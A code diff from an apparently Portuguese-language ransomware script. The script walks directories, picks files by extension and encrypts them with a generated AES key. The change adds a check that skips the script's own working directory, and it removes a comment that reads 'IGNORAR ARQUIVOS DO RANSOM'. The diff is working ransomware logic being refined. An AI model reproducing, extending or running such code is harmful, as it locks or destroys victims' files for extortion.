@@ -47,6 +47,7 @@ def listar_media(senha_AES,modo,tipos_arq):
 
 
 def listar(chave_AES,diretorio, tipos_arq, modo):
+    atual=os.getcwd()
     if(modo==1): # criptografa
         for caminho, diretorio, arquivo in os.walk(diretorio):
             for arq in arquivo:
@@ -54,11 +55,15 @@ def listar(chave_AES,diretorio, tipos_arq, modo):
                 extensao=os.path.splitext(a)
                 for ext in tipos_arq:
                     if(extensao[1]==ext):
-                        a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
-                        try:
-                            criptografa(chave_AES,a)
-                        except:
-                            print('erro ao criptografar-> ' +str(a))
+                        if(caminho==atual):
+                            ignorar=1
+                        else:
+                            a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
+                            print(a)
+                            try:
+                                criptografa(chave_AES,a)
+                            except:
+                                print('erro ao criptografar-> ' +str(a))
 
     else: # descriptgrafa
         for caminho, diretorio, arquivo in os.walk(diretorio):
@@ -107,10 +112,6 @@ def gera_chave_AES():
 
 def crypto_all():
 
-
-
-
-    ## IGNORAR ARQUIVOS DO RANSOM
     AES_key=gera_chave_AES()
     print('[*] Chave AES gerada')
     #menu(AES_key,1) # -> criptografa tudo
